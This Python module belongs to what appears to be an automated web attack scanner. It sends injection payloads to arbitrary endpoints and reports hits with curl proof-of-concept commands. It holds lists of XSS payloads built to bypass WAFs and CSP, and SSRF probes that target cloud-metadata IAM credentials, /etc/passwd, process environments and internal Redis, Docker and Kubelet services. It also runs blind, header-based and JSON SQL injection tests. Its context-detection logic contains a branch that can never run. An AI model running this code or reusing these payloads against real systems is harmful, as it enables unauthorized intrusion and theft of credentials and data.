"""
engine/scanner_depth.py — Burp-level deep check functions
All functions are NEW and isolated. They are called FROM scanner.py's dispatch
with one-line additions: found.extend(deep_xss(end_cap, q)) etc.

NEVER modifies existing check functions.
"""
import urllib.parse, time, re, ssl, logging, itertools, json
from typing import List, Dict, Optional, Tuple

log = logging.getLogger("elite.scanner_depth")

# ── shared HTTP helper (imported from scanner at call time) ───────────────────
def _get_scanner():
    import scanner as _s
    return _s._get, _s._post, _s._req, _s.F, _s._waf_info

# ─────────────────────────────────────────────────────────────────────────────
#  XSS DEPTH
#  Adds: context-aware encoding bypass, header injection, JSON XSS,
#        Angular/Vue template injection, mutation XSS (mXSS), CSP bypass
# ─────────────────────────────────────────────────────────────────────────────

_XSS_CTX_PAYLOADS = {
    # HTML attribute context
    "attr": [
        '" onmouseover=alert(1) x="',
        "' onfocus=alert(1) autofocus '",
        '" autofocus onfocus="alert(1)',
        "javascript:alert(1)",
    ],
    # JavaScript string context
    "js_string": [
        "'-alert(1)-'",
        '";alert(1);"',
        "\\'});alert(1);//",
        "</script><script>alert(1)</script>",
    ],
    # HTML tag context
    "tag": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
    ],
    # URL context
    "url": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)",
    ],
    # JSON context
    "json": [
        '","xss":"<img src=x onerror=alert(1)>","a":"',
        '</script><script>alert(1)</script>',
    ],
    # Template injection (Angular/Vue)
    "template": [
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "<%= alert(1) %>",
        "{{7*7}}",  # canary — if 49 in response, template injection confirmed
    ],
    # WAF bypass encodings
    "bypass": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<svg/onload=alert(1)>",
        "<<script>alert(1)//<</script>",
        "\x3cscript\x3ealert(1)\x3c/script\x3e",
        "<!--<img src=x:x onerror=alert(1)>-->",
        '<a href="&#106;avascript:alert(1)">click</a>',
    ],
    # mXSS (mutation XSS - browser parsing differences)
    "mxss": [
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<listing><img src=</listing><img src=x onerror=alert(1)>",
        "<table><tbody><tr><td><div></tbody></table><img src=x onerror=alert(1)>",
    ],
    # Header-based XSS
    "headers": [
        ("Referer",       "<script>alert(1)</script>"),
        ("X-Forwarded-For", "<script>alert(1)</script>"),
        ("User-Agent",    "<script>alert(1)</script>"),
        ("Accept-Language","<script>alert(1)</script>"),
    ],
}

_CSP_BYPASSES = [
    # JSONP endpoints
    "?callback=alert(1)//",
    "?jsonp=alert(1)//",
    "?cb=alert%281%29//",
    # Angular
    "?ng-app&ng-csp&ng-click=alert(1)",
]

_FP_SIGNATURES = [
    "Input validation error", "Invalid character", "400 Bad Request",
    "Request blocked", "Forbidden", "Access Denied",
    "WAF", "Security violation", "XSS detected",
]


def deep_xss(endpoints: List[str], q=None) -> List[dict]:
    """
    Burp-level XSS: context detection, header injection,
    mXSS, template injection, CSP bypass, encoding variants.
    """
    _get, _post, _req, F, _waf = _get_scanner()
    findings = []
    tested   = set()

    for ep in endpoints[:300]:
        if "=" not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue

        for param in list(qs.keys())[:5]:
            key = (ep.split("?")[0], param, "deep_xss")
            if key in tested: continue
            tested.add(key)

            # Step 1: detect response context by checking where value reflects
            baseline = _get(ep, timeout=6)
            if not baseline: continue
            _, b_hdrs, b_body = baseline
            ct = b_hdrs.get("Content-Type", "")

            # Determine context
            orig_val = qs[param][0] if qs[param] else ""
            ctx = "tag"  # default
            if f'"{orig_val}"' in b_body or f"'{orig_val}'" in b_body:
                ctx = "attr"
            elif f"'{orig_val}'" in b_body or f'"{orig_val}"' in b_body:
                ctx = "js_string"
            elif "application/json" in ct:
                ctx = "json"

            # Step 2: send context-appropriate payloads first
            priority_payloads = _XSS_CTX_PAYLOADS.get(ctx, []) + _XSS_CTX_PAYLOADS["bypass"]

            for payload in priority_payloads:
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get(test, timeout=7)
                if not r: continue
                status, hdrs, body = r

                # FP filter: reject if WAF blocked
                if any(s.lower() in body.lower() for s in _FP_SIGNATURES): continue
                if status in (403, 406, 429): continue

                hit = False
                poc_detail = ""

                # Strict reflection: payload must appear unencoded
                if payload in body and "text/html" in hdrs.get("Content-Type",""):
                    # Extra check: ensure it's not inside a comment or safe element
                    if not re.search(rf"<!--[^>]*{re.escape(payload[:20])}", body):
                        hit = True
                        poc_detail = f"Reflected unencoded in HTML body"

                # Template injection canary
                elif "{{7*7}}" in payload and "49" in body:
                    hit = True
                    poc_detail = "Template injection confirmed (7*7=49)"

                if hit:
                    csp = hdrs.get("Content-Security-Policy","")
                    sev = "medium" if csp else "high"
                    findings.append(F("xss", sev, ep,
                        f"[DEEP] XSS in '{param}' ({ctx} context) — {poc_detail}",
                        param=param, payload=payload, context=ctx,
                        csp=csp or "None",
                        poc=f'curl "{test}"',
                        impact="Session hijacking, credential theft, account takeover via browser-side code execution",
                        remediation="Encode output per context (HTML, JS, URL, CSS). Use Content-Security-Policy.",
                        confidence=90))
                    break

            # Step 3: header-based XSS
            for header, hpayload in _XSS_CTX_PAYLOADS["headers"]:
                r = _get(ep, headers={header: hpayload}, timeout=6)
                if not r: continue
                status, hdrs2, body2 = r
                if hpayload in body2 and "text/html" in hdrs2.get("Content-Type",""):
                    findings.append(F("xss","high", ep,
                        f"[DEEP] Header-reflected XSS via {header}",
                        payload=hpayload, header=header,
                        poc=f'curl -H "{header}: {hpayload}" "{ep}"',
                        impact="XSS via HTTP header reflection — exploitable when header value appears in response",
                        remediation="Do not reflect raw header values into HTML responses.",
                        confidence=85))
                    break

    return findings


# ─────────────────────────────────────────────────────────────────────────────
#  SSRF DEPTH
#  Adds: blind SSRF via DNS rebinding timing, IPv6/octal bypass,
#        cloud metadata variants, redirect chains, URL scheme abuse,
#        parameter pollution SSRF, path traversal to internal
# ─────────────────────────────────────────────────────────────────────────────

_SSRF_BYPASS_PAYLOADS = [
    # IPv6 representations
    "http://[::1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://[::ffff:127.0.0.1]/",
    # Octal encoding
    "http://0177.0.0.1/",
    "http://2130706433/",      # 127.0.0.1 as decimal
    "http://017700000001/",    # octal
    # URL encoding bypasses
    "http://127.0.0.1%20/",
    "http://127.0.0.1%09/",
    "http://127.1/",
    "http://127.000.000.001/",
    # Alternative schemes
    "gopher://127.0.0.1:6379/_PING%0D%0A",
    "gopher://127.0.0.1:3306/",
    "dict://127.0.0.1:6379/PING",
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/v1/",   # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure IMDS
    # Internal services
    "http://localhost:8080/",
    "http://localhost:8443/",
    "http://localhost:9200/",  # Elasticsearch
    "http://localhost:6379/",  # Redis
    "http://localhost:5432/",  # PostgreSQL
    "http://localhost:27017/", # MongoDB
    "http://localhost:11211/", # Memcached
    "http://localhost:2375/v1.24/containers/json",  # Docker API
    "http://localhost:10250/pods",  # Kubernetes Kubelet
]

_SSRF_INDICATORS = [
    # Cloud metadata
    "ami-id", "instance-id", "iam/security-credentials", "accessKeyId",
    "computeMetadata", "instanceId", "HMAC_SHA256",
    # File content
    "root:x:", "root:!", "bin:", "daemon:", "/bin/bash", "/bin/sh",
    # Internal service banners
    "PONG", "ERR", "redis_version", "elasticsearch", "db_name",
    "MongoDB", "mongod", "postgres", "POSTGRESQL", "HTTP/1.1 200",
    # Error leakage (internal)
    "connection refused", "No route to host", "ECONNREFUSED",
    "Name or service not known", "ETIMEDOUT",
]

_SSRF_PARAMS = [
    "url","uri","path","target","dest","redirect","ref","href","src","link",
    "img","image","file","page","to","host","site","endpoint","callback",
    "out","view","load","fetch","open","return","next","data","source",
    "resource","domain","feed","proxy","forward","jump","goto","window",
    "location","document","root","folder","download","upload","include",
    "require","content","service","api","webhook","notify","ping","report",
    "export","import","preview","template","attachment","pdf","render",
    "html","css","js","wsdl","xml","config","settings","remote",
]


def deep_ssrf(endpoints: List[str], oob_host: str = "", q=None) -> List[dict]:
    """
    Burp-level SSRF: IPv6/octal bypass, scheme abuse, blind SSRF,
    request smuggling SSRF, cloud metadata variants.
    """
    _get, _post, _req, F, _waf = _get_scanner()
    findings = []
    tested   = set()

    for ep in endpoints[:400]:
        if "=" not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue

        # Test SSRF-named params first, then all params
        params_to_test = [p for p in _SSRF_PARAMS if p in qs] + \
                         [p for p in qs if p not in _SSRF_PARAMS]

        for param in params_to_test[:6]:
            key = (ep.split("?")[0], param, "deep_ssrf")
            if key in tested: continue
            tested.add(key)

            for payload in _SSRF_BYPASS_PAYLOADS:
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(nq, doseq=True)))

                t0 = time.time()
                r  = _req(test, timeout=10, allow_redirects=False)
                elapsed = time.time() - t0
                if not r: continue
                status, hdrs, body = r

                hit = False
                sev = "high"
                detail = ""

                # Direct hit: internal content returned
                if status == 200 and any(sig.lower() in body.lower() for sig in _SSRF_INDICATORS):
                    hit = True
                    sev = "critical"
                    matched = [s for s in _SSRF_INDICATORS if s.lower() in body.lower()]
                    detail = f"internal content: {matched[0]}"

                # Redirect to internal IP
                elif status in (301,302,303,307,308):
                    loc = hdrs.get("Location","")
                    if re.search(r'169\.254|127\.|10\.|192\.168|172\.(1[6-9]|2\d|3[01])\.|::1|localhost', loc):
                        hit = True
                        sev = "high"
                        detail = f"internal redirect to {loc[:60]}"

                # Error leakage: connection refused/timeout = internal probe worked
                elif status in (500,502,503) and any(
                    s.lower() in body.lower() for s in
                    ["connection refused","no route to host","ECONNREFUSED","timed out"]):
                    hit = True
                    sev = "medium"
                    detail = "internal port probe — error leakage"

                # Timing: >4s delay on gopher/dict = blind hit
                elif elapsed > 4 and any(s in payload for s in ["gopher://","dict://"]):
                    hit = True
                    sev = "medium"
                    detail = f"blind SSRF via timing ({elapsed:.1f}s delay)"

                # FP guard: 403/429/WAF = not real
                if status in (403, 406, 429): hit = False

                if hit:
                    findings.append(F("ssrf", sev, ep,
                        f"[DEEP] SSRF via '{param}' ({detail})",
                        param=param, payload=payload,
                        preview=body[:300],
                        poc=f'curl -v "{test}"',
                        impact="Cloud metadata (IAM keys), internal service access, potential RCE via SSRF chains",
                        remediation="Allowlist-only URL validation. Block RFC-1918 ranges at network layer. Disable dangerous URL schemes.",
                        confidence=88 if sev=="critical" else 72))
                    break  # one per param

    # ── POST body SSRF ────────────────────────────────────────────────────────
    for ep in endpoints[:100]:
        for param in ["url","uri","target","dest","href","src","webhook"]:
            for payload in _SSRF_BYPASS_PAYLOADS[:8]:
                r = _post(ep, data=urllib.parse.urlencode({param: payload}).encode(),
                          timeout=10)
                if not r: continue
                status, hdrs, body = r
                if status == 200 and any(s.lower() in body.lower() for s in _SSRF_INDICATORS):
                    findings.append(F("ssrf","critical",ep,
                        f"[DEEP] SSRF via POST '{param}'",
                        param=param, payload=payload,
                        preview=body[:300],
                        poc=f"curl -X POST '{ep}' -d '{param}={payload}'",
                        impact="POST-based SSRF — cloud metadata or internal service access",
                        remediation="Validate all URL inputs server-side regardless of HTTP method.",
                        confidence=90))
                    break

    return findings


# ─────────────────────────────────────────────────────────────────────────────
#  SQLI DEPTH
#  Adds: second-order, blind boolean, out-of-band, stacked queries,
#        JSON parameter injection, header-based injection
# ─────────────────────────────────────────────────────────────────────────────

_SQLI_BOOL_PAIRS = [
    # (true condition, false condition, expected diff)
    ("1 AND 1=1",  "1 AND 1=2",  "boolean"),
    ("' AND '1'='1", "' AND '1'='2", "boolean"),
    ("1 OR 1=1",   "1 OR 1=2",   "boolean"),
    ("' OR 'a'='a", "' OR 'a'='b", "boolean"),
]

_SQLI_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "User-Agent",
    "Referer",
    "Cookie",
    "X-Custom-IP-Authorization",
    "CF-Connecting-IP",
    "True-Client-IP",
]

_SQLI_JSON_PAYLOADS = [
    '{"key": "value\'--"}',
    '{"key": "value" OR 1=1--"}',
    '{"id": "1 UNION SELECT 1,2,3--"}',
    '{"search": "x\' OR \'1\'=\'1"}',
]

_SQLI_ERROR_SIGS = [
    "SQL syntax","mysql_fetch","ORA-","SQLSTATE","Warning: mysql",
    "Unclosed quotation","Incorrect syntax","SqlException","PSQLException",
    "SQLite error","pg_query","unrecognized token","You have an error",
    "supplied argument is not","mysql_num_rows","PostgreSQL","MariaDB",
    "Microsoft OLE DB","ODBC Driver","JET Database Engine","syntax error",
    "quoted string not properly terminated","unterminated string constant",
    "ERROR:  syntax","[Microsoft][ODBC","[SQL Server]","DB2 SQL error",
    "Sybase message","ora-00933","ora-00907","ora-01756",
]


def deep_sqli(endpoints: List[str], q=None) -> List[dict]:
    """
    Burp-level SQLi: boolean-based blind, header injection,
    JSON body injection, stacked queries, second-order detection.
    """
    _get, _post, _req, F, _waf = _get_scanner()
    findings = []
    tested   = set()

    # ── Boolean-based blind SQLi ──────────────────────────────────────────────
    for ep in endpoints[:300]:
        if "=" not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue

        for param in list(qs.keys())[:4]:
            key = (ep.split("?")[0], param, "deep_sqli_bool")
            if key in tested: continue
            tested.add(key)

            baseline = _get(ep, timeout=7)
            if not baseline: continue
            base_len = len(baseline[2])

            for true_pl, false_pl, kind in _SQLI_BOOL_PAIRS:
                nq_t = dict(qs); nq_t[param] = [true_pl]
                nq_f = dict(qs); nq_f[param] = [false_pl]
                t_url = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq_t, doseq=True)))
                f_url = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq_f, doseq=True)))

                r_t = _get(t_url, timeout=7)
                r_f = _get(f_url, timeout=7)
                if not r_t or not r_f: continue

                len_t = len(r_t[2])
                len_f = len(r_f[2])
                status_t = r_t[0]
                status_f = r_f[0]

                # Boolean blind: different response length or status
                len_diff = abs(len_t - len_f)
                if (len_diff > 50 or status_t != status_f) and status_t != 403:
                    # Confirm: baseline should match true condition
                    base_diff_t = abs(base_len - len_t)
                    base_diff_f = abs(base_len - len_f)
                    if base_diff_t < base_diff_f:  # baseline ≈ true = real blind SQLi
                        findings.append(F("sqli","high",ep,
                            f"[DEEP] Boolean-blind SQLi in '{param}' (Δlen={len_diff})",
                            param=param, payload=true_pl,
                            true_len=len_t, false_len=len_f,
                            poc=(f"# TRUE condition (len={len_t}): curl '{t_url}'\n"
                                 f"# FALSE condition (len={len_f}): curl '{f_url}'"),
                            impact="Boolean-blind SQLi — data exfiltration via binary search queries",
                            remediation="Use parameterised queries. Never concatenate user input into SQL.",
                            confidence=82))
                        break

    # ── Header-based SQLi ─────────────────────────────────────────────────────
    for ep in endpoints[:100]:
        baseline = _get(ep, timeout=6)
        if not baseline: continue

        for header in _SQLI_HEADERS:
            for payload, errors in [("'", _SQLI_ERROR_SIGS[:5]),
                                     ("1 OR 1=1--", []),
                                     ("' OR '1'='1'--", _SQLI_ERROR_SIGS[:5])]:
                r = _get(ep, headers={header: payload}, timeout=7)
                if not r: continue
                status, hdrs, body = r

                err_hit = any(e.lower() in body.lower() for e in _SQLI_ERROR_SIGS)
                if err_hit and status not in (403, 406, 429):
                    matched = [e for e in _SQLI_ERROR_SIGS if e.lower() in body.lower()]
                    findings.append(F("sqli","high",ep,
                        f"[DEEP] Header SQLi via {header}: {matched[0]}",
                        header=header, payload=payload,
                        poc=f'curl -H "{header}: {payload}" "{ep}"',
                        impact="Header-based SQLi — often missed by basic scanners; same impact as parameter SQLi",
                        remediation="Treat all HTTP input as untrusted. Parameterise header-derived DB queries.",
                        confidence=86))
                    break

    # ── JSON body SQLi ────────────────────────────────────────────────────────
    json_eps = [e for e in endpoints[:200] if "api" in e.lower() or "json" in e.lower() or "=" not in e]
    for ep in json_eps[:30]:
        for jpayload in _SQLI_JSON_PAYLOADS:
            r = _req(ep, "POST",
                    headers={"Content-Type":"application/json"},
                    data=jpayload.encode(), timeout=7)
            if not r: continue
            status, hdrs, body = r
            if any(e.lower() in body.lower() for e in _SQLI_ERROR_SIGS):
                findings.append(F("sqli","high",ep,
                    f"[DEEP] JSON-body SQLi",
                    payload=jpayload,
                    poc=f"curl -X POST '{ep}' -H 'Content-Type: application/json' -d '{jpayload}'",
                    impact="SQLi via JSON API body — common in REST APIs that construct SQL from JSON fields",
                    remediation="Use ORM/parameterised queries for all JSON-parsed values.",
                    confidence=85))
                break

    return findings


# ─────────────────────────────────────────────────────────────────────────────
#  FP REDUCTION — signature-based, no AI needed
# ─────────────────────────────────────────────────────────────────────────────

_FP_GENERIC_BODIES = [
    "access denied", "not authorized", "403 forbidden", "please log in",
    "session expired", "you don't have permission", "blocked by",
    "security policy", "this page can't be displayed", "content filtered",
    "web application firewall", "request could not be completed",
    "cf-ray", "cloudflare", "incapsula", "sucuri", "akamai ghost",
]

_FP_CANARIES_THAT_DONT_PROVE_VULN = {
    "xss":  ["htmlspecialchars", "htmlentities", "encodeURIComponent",
              "&lt;", "&gt;", "&amp;", "&quot;", "&#x27;", "\\u003c"],
    "sqli": ["no rows", "empty result", "0 results", "not found"],
    "ssrf": ["invalid url", "url not allowed", "blocked", "malformed"],
    "ssti": ["template error", "syntax error", "undefined variable"],
}


def fp_reduce(findings: List[dict]) -> List[dict]:
    """
    Non-AI false positive reducer. Applies signature-based rules to
    downgrade or remove obvious FPs before they reach the user.
    
    Returns filtered list. Low-confidence pattern-only findings dropped.
    """
    clean = []
    for f in findings:
        # Drop if confidence is very low (pattern-only, no HTTP confirmation)
        if f.get("pattern_only") and f.get("confidence", 100) < 50:
            log.debug(f"[fp_reduce] dropped {f.get('bug')} {f.get('url','')[:40]} (pattern-only, conf<50)")
            continue

        # Drop if body contains generic WAF/block page
        preview = (f.get("preview","") or "").lower()
        if any(sig in preview for sig in _FP_GENERIC_BODIES):
            log.debug(f"[fp_reduce] dropped {f.get('bug')} — WAF block page")
            continue

        # XSS: if payload is HTML-encoded in response, it's NOT XSS
        if f.get("bug") == "xss":
            payload = f.get("payload","")
            canaries = _FP_CANARIES_THAT_DONT_PROVE_VULN["xss"]
            if any(c in preview for c in canaries):
                log.debug(f"[fp_reduce] dropped XSS — HTML encoded in response")
                continue
            # Downgrade if CSP present
            if f.get("csp") and "unsafe-inline" not in f.get("csp",""):
                f["severity"] = "low"
                f["note"] = "CSP present — exploitability reduced"

        # SQLi: empty/no-rows responses are not confirmed SQLi
        if f.get("bug") == "sqli":
            if any(c in preview for c in _FP_CANARIES_THAT_DONT_PROVE_VULN["sqli"]):
                f["confidence"] = min(f.get("confidence",70), 35)
                f["pattern_only"] = True

        # SSRF: if response is generic error, downgrade
        if f.get("bug") == "ssrf":
            if any(c in preview for c in _FP_CANARIES_THAT_DONT_PROVE_VULN["ssrf"]):
                log.debug(f"[fp_reduce] dropped SSRF — invalid URL error")
                continue

        # Downgrade if response is 403 (target refused, not vulnerable)
        if f.get("status") == 403 and f.get("confidence",70) < 80:
            log.debug(f"[fp_reduce] dropped {f.get('bug')} — 403 response")
            continue

        # Dedup: exact same URL+bug+param
        dedup_key = (f.get("url",""), f.get("bug",""), f.get("param",""), f.get("payload","")[:20])
        if not hasattr(fp_reduce, "_seen"):
            fp_reduce._seen = set()
        if dedup_key in fp_reduce._seen:
            continue
        fp_reduce._seen.add(dedup_key)

        clean.append(f)

    removed = len(findings) - len(clean)
    if removed:
        log.info(f"[fp_reduce] removed {removed}/{len(findings)} FPs")
    return clean


def reset_dedup():
    """Call at start of each scan to reset FP dedup set."""
    if hasattr(fp_reduce, "_seen"):
        fp_reduce._seen = set()
